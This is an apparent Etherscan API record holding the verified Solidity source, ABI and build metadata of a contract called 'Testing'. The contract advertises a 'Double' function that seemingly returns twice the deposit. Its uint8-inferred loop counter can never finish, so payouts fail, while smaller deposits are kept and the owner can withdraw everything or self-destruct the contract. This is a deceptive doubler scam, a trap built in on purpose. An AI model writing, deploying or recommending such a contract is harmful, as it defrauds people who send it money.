{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.26;\r\n\r\ncontract Testing {\r\n    address owner;\r\n    \r\n    constructor() payable public { \r\n       owner = msg.sender;\r\n    }\r\n    function withdraw() payable public {\r\n        require(msg.sender==owner);\r\n        owner.transfer(address(this).balance);\r\n    }\r\n    \r\n    function Double() payable public {\r\n        if(msg.value> 1 ether) {\r\n            uint256 multi=0;\r\n            uint256 amountToTransfer=0;\r\n            for(var i=0;i<msg.value*2;i++) {\r\n                multi=i*2;\r\n                if(multi<amountToTransfer) {\r\n                    break;  \r\n                }\r\n                amountToTransfer=multi;\r\n            }    \r\n            msg.sender.transfer(amountToTransfer);\r\n        }\r\n    }\r\n    \r\n    function destroy() public {\r\n        require(msg.sender==owner);\r\n        selfdestruct(msg.sender);\r\n    }\r\n\r\n    function() payable external {}\r\n}","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"Double\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"destroy\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"Testing","CompilerVersion":"v0.4.26+commit.4563c3fc","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://acb1e8eb3b022dc55c5265b61f1d2dd0ca8edf909b1827e979d50e9598558f91"}]}